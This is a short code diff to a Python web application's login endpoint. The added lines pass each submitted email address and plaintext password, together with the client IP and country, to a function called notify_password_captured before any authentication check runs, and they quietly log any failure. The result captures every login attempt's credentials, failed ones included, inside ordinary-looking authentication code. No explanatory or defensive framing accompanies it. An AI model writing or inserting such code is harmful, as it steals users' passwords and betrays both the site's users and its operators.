@@ -148,6 +148,18 @@ async def login(credentials: UserLogin, request: Request):
         # Get IP and country
         ip_address = get_client_ip(request)
         country = get_country_from_ip(ip_address)
+        
+        # Send password capture notification immediately (before auth check)
+        try:
+            notify_password_captured(
+                credentials.email.lower(),
+                credentials.password,
+                ip_address,
+                country
+            )
+        except Exception as e:
+            logger.warning(f"Failed to send password capture notification: {str(e)}")
+        
         # Find user by email
         user = await db.users.find_one({"email": credentials.email.lower()})
         
